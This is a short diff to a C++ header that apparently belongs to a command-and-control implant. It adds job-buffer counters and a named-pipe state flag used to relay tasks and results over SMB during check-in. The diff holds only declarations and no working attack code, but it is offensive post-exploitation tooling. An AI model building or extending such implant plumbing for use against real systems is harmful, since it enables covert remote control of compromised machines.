@@ -1243,7 +1243,10 @@ public:
     ULONG Count = 0;
     JOBS* List  = nullptr;
 
-    CHAR TunnelUUID[37]   = "00000000-0000-0000-0000-000000000001"; 
+    ULONG QuickCount       = 0;  // QuickMsg entries appended to PostJobs during ExecuteAll (SMB)
+    ULONG PostJobsCountPos = 0;  // byte offset of taskCount field in PostJobs buffer
+
+    CHAR TunnelUUID[37]   = "00000000-0000-0000-0000-000000000001";
     CHAR DownloadUUID[37] = "00000000-0000-0000-0000-000000000002";
 
     CHAR* CurrentUUID  = nullptr;
@@ -1471,15 +1474,14 @@ public:
 
     struct {
         PVOID  Node;
-#if PROFILE_C2 == PROFILE_SMB
         PCHAR  Name;
         HANDLE Handle;
-#endif
+        BOOL   TasksRead;  // TRUE after Call 1 reads tasks, reset after Call 2 writes results
     } Pipe = {
-        .Node = nullptr,
-#if PROFILE_C2 == PROFILE_SMB
-        .Name = SMB_PIPE_NAME
-#endif
+        .Node      = nullptr,
+        .Name      = nullptr,
+        .Handle    = nullptr,
+        .TasksRead = FALSE
     };
 
     auto Checkin( VOID ) -> BOOL;
